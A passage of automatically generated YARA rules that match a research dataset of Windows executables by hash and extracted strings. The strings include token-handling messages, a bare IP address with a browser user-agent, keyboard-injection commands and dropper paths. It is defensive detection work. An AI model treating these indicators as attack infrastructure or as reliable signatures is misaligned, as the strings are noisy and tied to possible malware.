      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "Setup=C:\\Windows\\Temp\\HQf_VP.exe" fullword ascii /* score: '28.00'*/
      $s8 = "Setup=C:\\Windows\\Temp\\WinRAR1.exe" fullword ascii /* score: '28.00'*/
      $s9 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s10 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s11 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s12 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s13 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s14 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s15 = "WinRAR1.exe" fullword ascii /* score: '22.00'*/
      $s16 = "sfxrar.exe" fullword ascii /* score: '22.00'*/
      $s17 = "D:\\Projects\\WinRAR\\sfx\\build\\sfxrar32\\Release\\sfxrar.pdb" fullword ascii /* score: '19.00'*/
      $s18 = "$GETPASSWORD1:IDOK" fullword ascii /* score: '17.00'*/
      $s19 = "$GETPASSWORD1:SIZE" fullword ascii /* score: '17.00'*/
      $s20 = "  <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule sig_1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50 {
   meta:
      description = "dataset - file 1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "1c8de01df040c973b37ae5ce8e1bb523e1ba24a9c25263706022f9a9894a2e50"
   strings:
      $s1 = "ImportTxtFile.exe" fullword ascii /* score: '25.00'*/
      $s2 = "ImportTxtFile.EXE" fullword wide /* score: '25.00'*/
      $s3 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s4 = "FieldDefs.txt" fullword ascii /* score: '14.00'*/
      $s5 = "C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\VC\\atlmfc\\include\\afxwin1.inl" fullword ascii /* score: '13.00'*/
      $s6 = "ImportTxtFile Version 1.0" fullword wide /* score: '10.00'*/
      $s7 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s8 = ".?AVCFECFileDialog@@" fullword ascii /* score: '9.00'*/
      $s9 = "CFECFileDialog" fullword ascii /* score: '9.00'*/
      $s10 = ".?AVCFileContents@@" fullword ascii /* score: '9.00'*/
      $s11 = "Define each field by clicking on column header." fullword wide /* score: '9.00'*/
      $s12 = "CPropSheetImportTxtFile" fullword ascii /* score: '7.00'*/
      $s13 = "You need to set up the FieldDefs.txt file in the application subdirectory" fullword ascii /* score: '7.00'*/
      $s14 = ".?AVCPageImportTxtFile@@" fullword ascii /* score: '7.00'*/
      $s15 = "Import Text File" fullword wide /* score: '7.00'*/
      $s16 = "CPageImportTxtFile" fullword ascii /* score: '7.00'*/
      $s17 = ".?AVCPropSheetImportTxtFile@@" fullword ascii /* score: '7.00'*/
      $s18 = ".?AVCImportTxtFileApp@@" fullword ascii /* score: '7.00'*/
      $s19 = "About ImportTxtFile" fullword wide /* score: '7.00'*/
      $s20 = "Fields are character delimited (exercise for the reader)" fullword wide /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f {
   meta:
      description = "dataset - file 82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "82e5ff5e7f3f7f06b3608075275fa8d7dce8978e349007597cf25d5f7cb60c5f"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "shellStarter_x64.dll" fullword ascii /* score: '25.00'*/
      $s3 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s4 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* score: '6.00'*/
      $s6 = "vileges></security></trustInfo><application xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http:/" ascii /* score: '6.00'*/
      $s7 = "SECURITY" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.71'*/ /* Goodware String - occured 291 times */
      $s8 = "Hardware" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.68'*/ /* Goodware String - occured 321 times */
      $s9 = "HKEY_PERFORMANCE_DATA" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.67'*/ /* Goodware String - occured 335 times */
      $s10 = "FileType" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.65'*/ /* Goodware String - occured 346 times */
      $s11 = "HKEY_DYN_DATA" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.65'*/ /* Goodware String - occured 350 times */
      $s12 = "HKEY_CURRENT_CONFIG" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.64'*/ /* Goodware String - occured 358 times */
      $s13 = "HKEY_USERS" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.55'*/ /* Goodware String - occured 447 times */
      $s14 = "TypeLib" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.55'*/ /* Goodware String - occured 449 times */
      $s15 = "HKEY_CLASSES_ROOT" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.54'*/ /* Goodware String - occured 457 times */
      $s16 = "HKEY_CURRENT_USER" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.50'*/ /* Goodware String - occured 495 times */
      $s17 = "SYSTEM" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.49'*/ /* Goodware String - occured 509 times */
      $s18 = "HKEY_LOCAL_MACHINE" fullword ascii /* PEStudio Blacklist: reg */ /* score: '4.47'*/ /* Goodware String - occured 534 times */
      $s19 = "ipGRDbIu" fullword ascii /* score: '4.00'*/
      $s20 = "E8H9E0t" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b {
   meta:
      description = "dataset - file 7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7875c40a3b6e223df3f34a081d1fe418d84cc1c14b49aa5e4ec184279167467b"
   strings:
      $s1 = "K:\\WindowsSDK7-Samples-master\\WindowsSDK7-Samples-master\\winbase\\DeviceFoundation\\PNPX\\SimpleThermostat\\Release\\x64\\UPn" ascii /* score: '24.00'*/
      $s2 = "UPnPSimpleThermostatDevice.dll" fullword ascii /* score: '23.00'*/
      $s3 = "ermostatDeviceDLL.pdb" fullword ascii /* score: '19.00'*/
      $s4 = "2GetDesiredTempWW" fullword ascii /* score: '16.00'*/
      $s5 = "GetCurrentTempWW" fullword ascii /* score: '16.00'*/
      $s6 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s7 = "K:\\WindowsSDK7-Samples-master\\WindowsSDK7-Samples-master\\winbase\\DeviceFoundation\\PNPX\\SimpleThermostat\\Release\\x64\\UPn" ascii /* score: '12.00'*/
      $s8 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s9 = "`template-parameter-" fullword ascii /* score: '11.00'*/
      $s10 = "plTempOutWWW" fullword ascii /* score: '11.00'*/
      $s11 = "SetDesiredTempWW" fullword ascii /* score: '11.00'*/
      $s12 = "lTempWWWd" fullword ascii /* score: '11.00'*/
      $s13 = "desiredTempW" fullword ascii /* score: '11.00'*/
      $s14 = "DEcurrentTempW" fullword ascii /* score: '11.00'*/
      $s15 = "plTempWW" fullword ascii /* score: '11.00'*/
      $s16 = "AppPolicyGetWindowingModel" fullword ascii /* score: '9.00'*/
      $s17 = "AppPolicyGetShowDeveloperDiagnostic" fullword ascii /* score: '9.00'*/
      $s18 = "ISimpleThermostat_UPnPService InterfaceWWW" fullword ascii /* score: '7.00'*/
      $s19 = ".?AVCSimpleThermostatService@@" fullword ascii /* score: '7.00'*/
      $s20 = "Some different radices: %d %x %o %#x %#o " fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227a5cc68 {
   meta:
      description = "dataset - file 74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227a5cc68"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227a5cc68"
   strings:
      $s1 = "c:\\users\\orange\\documents\\visual studio 2017\\Projects\\ConsoleApplication18\\Release\\ConsoleApplication18.pdb" fullword ascii /* score: '29.00'*/
      $s2 = "        <requestedExecutionLevel level='asInvoker' uiAccess='false' />" fullword ascii /* score: '15.00'*/
      $s3 = "qDBIX,D[EBExD`[" fullword ascii /* score: '4.00'*/
      $s4 = "aCVE@@M" fullword ascii /* score: '4.00'*/
      $s5 = "_set_new_mode" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s6 = "_get_initial_narrow_environment" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s7 = "_seh_filter_exe" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = ".CRT$XIAC" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s9 = "_set_app_type" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s10 = "FlD,<,,D,,l,{Dt" fullword ascii /* score: '1.00'*/
      $s11 = "9,9:9{9" fullword ascii /* score: '1.00'*/
      $s12 = "{{{{{D" fullword ascii /* score: '1.00'*/
      $s13 = "7.7:7I7R7_7" fullword ascii /* score: '1.00'*/
      $s14 = "4$4)4/494C4S4c4s4|4" fullword ascii /* score: '1.00'*/
      $s15 = "{F+}z|D" fullword ascii /* score: '1.00'*/
      $s16 = "D,y_I^" fullword ascii /* score: '1.00'*/
      $s17 = "5 5(5d8h8" fullword ascii /* score: '1.00'*/
      $s18 = "8d2{8v" fullword ascii /* score: '1.00'*/
      $s19 = "0 00080=0K0S0Z0" fullword ascii /* score: '1.00'*/
      $s20 = "u\"h<3@" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 30KB and
      8 of them
}

rule sig_7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243 {
   meta:
      description = "dataset - file 7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7920fb3873012f1abef8c2abfb905e53317595874985f24b23fb318b54b1e243"
   strings:
      $s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s2 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "raxaxai" fullword ascii /* score: '8.00'*/
      $s4 = "ex22a Version 1.0" fullword wide /* score: '7.00'*/
      $s5 = "ihkLbb4" fullword ascii /* score: '5.00'*/
      $s6 = "MAZOWIECKIE1" fullword ascii /* score: '5.00'*/
      $s7 = "Warszawa1" fullword ascii /* score: '5.00'*/
      $s8 = "xneGCCI " fullword ascii /* score: '4.00'*/
      $s9 = "-OqRbZ$," fullword ascii /* score: '4.00'*/
      $s10 = "QkDi!m" fullword ascii /* score: '4.00'*/
      $s11 = "^gZXtJkh" fullword ascii /* score: '4.00'*/
      $s12 = "[LDfrd| 5" fullword ascii /* score: '4.00'*/
      $s13 = "gRbySgfVw" fullword ascii /* score: '4.00'*/
      $s14 = ".?AVCEx22aApp@@" fullword ascii /* score: '4.00'*/
      $s15 = "CjvCIa`" fullword ascii /* score: '4.00'*/
      $s16 = "jDehTc^Iu" fullword ascii /* score: '4.00'*/
      $s17 = "MUNtWqp" fullword ascii /* score: '4.00'*/
      $s18 = "w(D9t$(t" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "zHIrA+O" fullword ascii /* score: '4.00'*/
      $s20 = "!TFrJ,^s;%'" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c {
   meta:
      description = "dataset - file a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
   strings:
      $x1 = "LaunchProcessAsNotElevatedUser cmd: " fullword wide /* score: '32.00'*/
      $s2 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s3 = "Using linked token from not elevated process " fullword wide /* score: '30.00'*/
      $s4 = "Using primary token from elevated process " fullword wide /* score: '30.00'*/
      $s5 = "could not find GetVersionExW in Kernel32.dll" fullword wide /* score: '28.00'*/
      $s6 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '27.00'*/
      $s7 = "http://www.adobe.com/support/downloads/product.jsp?product=1&platform=Windows" fullword ascii /* score: '26.00'*/
      $s8 = "http://www.adobe.com/support/downloads/product.jsp?product=10&platform=Windows" fullword ascii /* score: '26.00'*/
      $s9 = "Using primary token from elevated process or ordered by caller  " fullword wide /* score: '26.00'*/
      $s10 = "DComdlg32.dll" fullword wide /* score: '26.00'*/
      $s11 = "could not get module handle for Kernel32.dll" fullword wide /* score: '25.00'*/
      $s12 = "GetTokenFromSpecificProcess: " fullword wide /* score: '23.00'*/
      $s13 = "AdobeARMHelper.exe" fullword ascii /* score: '22.00'*/
      $s14 = "AdobeARM.exe" fullword ascii /* score: '22.00'*/
      $s15 = "D:\\DCB\\CBT_Main\\BuildResults\\bin\\Win32\\Release\\AdobeARMHelper.pdb" fullword ascii /* score: '22.00'*/
      $s16 = "adobearm.exe" fullword wide /* score: '22.00'*/
      $s17 = "no running adobearm.exe" fullword wide /* score: '22.00'*/
      $s18 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publ" ascii /* score: '21.00'*/
      $s19 = "ShellExecute failed" fullword wide /* score: '21.00'*/
      $s20 = "CreateProcessAsUser failed" fullword wide /* score: '21.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583 {
   meta:
      description = "dataset - file a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a9d94d703fc37de592e1d5bfffed76e199ac21bd67bfdc8aee7325a43d847583"
   strings:
      $s1 = "MsgBoxTest.exe" fullword wide /* score: '22.00'*/
      $s2 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s3 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s4 = "CMessageBoxDialog" fullword ascii /* score: '9.00'*/
      $s5 = ".?AVCMessageBoxDialog@@" fullword ascii /* score: '9.00'*/
      $s6 = "Content of the message box" fullword wide /* score: '9.00'*/
      $s7 = "Your message box was displayed successfully or, if the result was stored in the registry, returned the former result, because th" wide /* score: '8.00'*/
      $s8 = "&f:\"QO" fullword ascii /* score: '7.00'*/
      $s9 = "COmD+hc" fullword ascii /* score: '7.00'*/
      $s10 = "The message boxes have been reset. Those one with checkboxes will be displayed again, even if the user selected the \"Don't disp" wide /* score: '7.00'*/
      $s11 = "DINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDING" fullword ascii /* score: '6.50'*/
      $s12 = "TROLOLO" fullword wide /* score: '6.50'*/
      $s13 = "IDTRYAGAIN" fullword wide /* score: '6.50'*/
      $s14 = "IDCONTINUE" fullword wide /* score: '6.50'*/
      $s15 = "IDYESTOALL" fullword wide /* score: '6.50'*/
      $s16 = "IDNOTOALL" fullword wide /* score: '6.50'*/
      $s17 = "IDSKIPALL" fullword wide /* score: '6.50'*/
      $s18 = "IDIGNOREALL" fullword wide /* score: '6.50'*/
      $s19 = "EEEAAAA3345" ascii /* score: '5.00'*/
      $s20 = "\\0 eVfgW/+" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a {
   meta:
      description = "dataset - file 234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "234e4df3d9304136224f2a6c37cb6b5f6d8336c4e105afce857832015e97f27a"
   strings:
      $s1 = "]n{1Qn{5QdS%R%%" fullword ascii /* score: '5.00'*/
      $s2 = "'j9&- " fullword ascii /* score: '5.00'*/
      $s3 = "3;a3_/3" fullword ascii /* score: '5.00'*/ /* hex encoded string ':3' */
      $s4 = "windir" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.95'*/ /* Goodware String - occured 47 times */
      $s5 = "DceRpcSs" fullword ascii /* score: '4.00'*/
      $s6 = ".HJd!A" fullword ascii /* score: '4.00'*/
      $s7 = "j.kwb-A" fullword ascii /* score: '4.00'*/
      $s8 = "G\\.PGB~VO" fullword ascii /* score: '4.00'*/
      $s9 = "fRGE`ZGAd[1" fullword ascii /* score: '4.00'*/
      $s10 = "srov5=%" fullword ascii /* score: '4.00'*/
      $s11 = "iVOj!j" fullword ascii /* score: '4.00'*/
      $s12 = "%s\\System32\\%s" fullword ascii /* score: '1.00'*/ /* Goodware String - occured 4 times */
      $s13 = "GCC: (GNU) 8.3-win32 20190406" fullword ascii /* score: '1.00'*/
      $s14 = "GCC: (GNU) 7.3-win32 20180506" fullword ascii /* score: '1.00'*/
      $s15 = "d[=j.j" fullword ascii /* score: '1.00'*/
      $s16 = "f9IUk0G^|+UCq\"[HR" fullword ascii /* score: '1.00'*/
      $s17 = "6>^UQA" fullword ascii /* score: '1.00'*/
      $s18 = "-eZ*xmc" fullword ascii /* score: '1.00'*/
      $s19 = "Hamc9Q" fullword ascii /* score: '1.00'*/
      $s20 = "yzJ o.1" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      8 of them
}

rule cb18432353e218676537e6fca6ab87c1ec57e356933eb8b6a4e012d1d6aaba63 {
   meta:
      description = "dataset - file cb18432353e218676537e6fca6ab87c1ec57e356933eb8b6a4e012d1d6aaba63"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "cb18432353e218676537e6fca6ab87c1ec57e356933eb8b6a4e012d1d6aaba63"
   strings:
      $s1 = "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)" fullword ascii /* score: '12.00'*/
      $s2 = "103.234.72.237" fullword ascii /* score: '6.00'*/
      $s3 = "GCC: (x86_64-win32-sjlj-rev0, Built by MinGW-W64 project) 8.1.0" fullword ascii /* score: '4.00'*/
      $s4 = ")))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s5 = "111111," fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s6 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s7 = "111111111111111" ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s8 = "\\@_Cr\"" fullword ascii /* score: '2.00'*/
      $s9 = "11111111111111111" ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s10 = "MZuWVS" fullword ascii /* score: '1.00'*/
      $s11 = "))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))" fullword ascii /* score: '1.00'*/
      $s12 = "1111111111111111111111111111111111111111111111111111111111111111111111111" ascii /* score: '1.00'*/
      $s13 = "9@\"ZaPF" fullword ascii /* score: '1.00'*/
      $s14 = "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111" ascii /* score: '1.00'*/
      $s15 = "11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111" ascii /* score: '1.00'*/
      $s16 = " ^2?/^" fullword ascii /* score: '1.00'*/
      $s17 = ",,,,,,,11111111111" fullword ascii /* score: '1.00'*/
      $s18 = "[F5y`\">" fullword ascii /* score: '1.00'*/
      $s19 = "0X{|\\Y" fullword ascii /* score: '1.00'*/
      $s20 = "111111111,,,,,," fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule sig_132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f {
   meta:
      description = "dataset - file 132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "132bdcb986e3e3b9599b5b293b3318e7c630495e87a9d1fa02287ae80f9e652f"
   strings:
      $s1 = "FTreeBrowser.dll" fullword ascii /* score: '23.00'*/
      $s2 = "FTreeBrowser.EXE" fullword wide /* score: '22.00'*/
      $s3 = "wwwwpppp" fullword ascii /* reversed goodware string 'ppppwwww' */ /* score: '18.00'*/
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii /* score: '15.00'*/
      $s5 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s6 = " /p \"%1\"" fullword ascii /* score: '9.00'*/
      $s7 = "wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww" fullword ascii /* score: '8.00'*/
      $s8 = "pwwwwppwwwwwwwwwwttp" fullword ascii /* score: '8.00'*/
      $s9 = "FTreeBrowser Version 1.0" fullword wide /* score: '7.00'*/
      $s10 = "FtreeB Files (*.ftb)" fullword wide /* score: '7.00'*/
      $s11 = "FTreeBrowser.Document" fullword wide /* score: '7.00'*/
      $s12 = " /pt \"%1\" \"%2\" \"%3\" \"%4\"" fullword ascii /* score: '5.00'*/
      $s13 = "DllRegisterServer1" fullword ascii /* score: '5.00'*/
      $s14 = "Regserver" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.89'*/ /* Goodware String - occured 111 times */
      $s15 = "command" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.48'*/ /* Goodware String - occured 524 times */
      $s16 = "wwwwwDDwwtGwwwwwDwwwDwwwGp" fullword ascii /* score: '4.00'*/
      $s17 = "L9zPtD9{" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "wtDwwwwwDGwwDGwwGp" fullword ascii /* score: '4.00'*/
      $s19 = "wwGDwwwwwttp" fullword ascii /* score: '4.00'*/
      $s20 = ".fD9afu" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9 {
   meta:
      description = "dataset - file dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "oGgoQd.exe" fullword wide /* score: '22.00'*/
      $s3 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s5 = "Keyboard.end();" fullword ascii /* score: '13.00'*/
      $s6 = "get_YourComputerName" fullword ascii /* score: '12.00'*/
      $s7 = "get_ComputerType" fullword ascii /* score: '12.00'*/
      $s8 = "GetSerialPortNames" fullword ascii /* score: '12.00'*/
      $s9 = "get_Competitive" fullword ascii /* score: '12.00'*/
      $s10 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s11 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s12 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "System.Windows.Forms.Form" fullword ascii /* score: '10.00'*/
      $s14 = "Keyboard.print('1');" fullword ascii /* score: '10.00'*/
      $s15 = "Keyboard.print('q');" fullword ascii /* score: '10.00'*/
      $s16 = "Keyboard.print('5');" fullword ascii /* score: '10.00'*/
      $s17 = "Keyboard.print('=');" fullword ascii /* score: '10.00'*/
      $s18 = "Keyboard.print('2');" fullword ascii /* score: '10.00'*/
      $s19 = "Keyboard.print('7');" fullword ascii /* score: '10.00'*/
      $s20 = "Keyboard.press(KEY_RIGHT_ALT);" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule sig_0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343 {
   meta:
      description = "dataset - file 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADJS" fullword ascii /* score: '27.00'*/
      $s3 = "http://www.javascriptkit.com/" fullword wide /* score: '23.00'*/
      $s4 = "get_JavascriptTemplatesToolStripMenuItem" fullword ascii /* score: '22.00'*/
      $s5 = " - Click <a target=\"_blank\" href=\"" fullword wide /* score: '22.00'*/
      $s6 = "HTML_Comet.LogFo.resources" fullword ascii /* score: '21.00'*/
      $s7 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s8 = "rmU4b5l.exe" fullword wide /* score: '19.00'*/
      $s9 = "_Error_Log.txt" fullword wide /* score: '19.00'*/
      $s10 = "\\templates\\websites\\sitelist.txt" fullword wide /* score: '19.00'*/
      $s11 = "$JavascriptTemplatesToolStripMenuItem" fullword ascii /* score: '17.00'*/
      $s12 = "785f6b3e756c" ascii /* score: '17.00'*/ /* hex encoded string 'x_k>ul' */
      $s13 = "set_JavascriptTemplatesToolStripMenuItem" fullword ascii /* score: '17.00'*/
      $s14 = "JavascriptTemplatesToolStripMenuItem_Click" fullword ascii /* score: '17.00'*/
      $s15 = "JavascriptTemplatesToolStripMenuItem" fullword wide /* score: '17.00'*/
      $s16 = "https://www.w3schools.com/howto/default.asp" fullword wide /* score: '17.00'*/
      $s17 = "https://css-tricks.com/snippets/html/" fullword wide /* score: '17.00'*/
      $s18 = "https://www.w3schools.com/html/default.asp" fullword wide /* score: '17.00'*/
      $s19 = "templates/javascript" fullword wide /* score: '17.00'*/
      $s20 = " - Heading <font color=\"#808080\">(Lecturer) </font><font color=\"#FF0000\"><i>NEW</i></font></b><br><br>message<br></li>" fullword wide /* score: '17.00'*/
   condition:
